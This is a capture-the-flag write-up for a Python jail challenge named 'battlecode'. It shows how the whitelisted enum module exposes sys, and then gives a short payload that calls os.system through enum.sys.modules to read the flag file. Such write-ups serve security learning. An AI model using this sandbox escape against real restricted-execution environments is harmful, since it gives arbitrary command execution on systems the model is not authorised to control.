# battlecode

```
look who's trying to sandbox python with restrictedpython

nc challs1.pyjail.club 19290
```

Attachment:

```python
#!/usr/local/bin/python3
from os import system

print('battlecode. end input with __EOF__')

code = ''
while (line := input()) != '__EOF__':
    code += line
    code += '\n'

system('cp -r /battlecode25-scaffold /tmp/battlecode25-scaffold')

with open('/tmp/battlecode25-scaffold/python/src/examplefuncsplayer/bot.py', 'w') as f:
    f.write(code)

system(b'cd /tmp/battlecode25-scaffold/python && /usr/local/bin/python3 /tmp/battlecode25-scaffold/python/run.py run --p1 examplefuncsplayer --p2 examplefuncsplayer')

print('goodbye')
```

Our code is running under restricted environment for battlecode game. Reading the code of the container, we find some modules that are allowed to import:

```python
# battlecode25/engine/container/runner.py
def import_call(self, name, globals=None, locals=None, fromlist=(), level=0, caller='robot'):
    if not isinstance(name, str) or not (isinstance(fromlist, tuple) or fromlist is None):
        raise ImportError('Invalid import.')

    if name == '':
        # This should be easy to add, but it's work.
        raise ImportError('No relative imports (yet).')

    if not name in self.code:
        if name == 'random':
            import random
            return random
        if name == 'math':
            import math
            return math
        if name == 'enum':
            import enum
            return enum

        raise ImportError('Module "' + name + '" does not exist.')
```

We find that `enum` module can be used to access `sys`, just as we can access `sys` from `datetime` in [Vibe Web Mail](../2025-09-26-iran-tech-olympics-ctf-2025/vibe-web-mail.md):

```shell
$ python3.12
>>> import enum
>>> dir(enum)
['CONFORM', 'CONTINUOUS', 'DynamicClassAttribute', 'EJECT', 'Enum', 'EnumCheck', 'EnumMeta', 'EnumType', 'Flag', 'FlagBoundary', 'IntEnum', 'IntFlag', 'KEEP', 'MappingProxyType', 'NAMED_FLAGS', 'ReprEnum', 'STRICT', 'StrEnum', 'UNIQUE', '_EnumDict', '__all__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '_auto_null', '_dataclass_repr', '_dedent', '_high_bit', '_is_descriptor', '_is_dunder', '_is_internal_class', '_is_private', '_is_single_bit', '_is_sunder', '_iter_bits_lsb', '_make_class_unpicklable', '_not_given', '_old_convert_', '_or_', '_proto_member', '_reduce_ex_by_global_name', '_simple_enum', '_stdlib_enums', '_test_simple_enum', 'auto', 'bin', 'bltns', 'global_enum', 'global_enum_repr', 'global_flag_repr', 'global_str', 'member', 'nonmember', 'pickle_by_enum_name', 'pickle_by_global_name', 'property', 'reduce', 'show_flag_values', 'sys', 'unique', 'verify']
>>> enum.sys
<module 'sys' (built-in)>
```

Attack:

```python
import enum


def turn():
    enum.sys.modules["os"].system("cat /app/flag.txt")


__EOF__
```

Flag: `jail{enum_is_based_for_importing_sys_and_builtins}`.

First blood: `wake up, jiegec just blooded battlecode`.
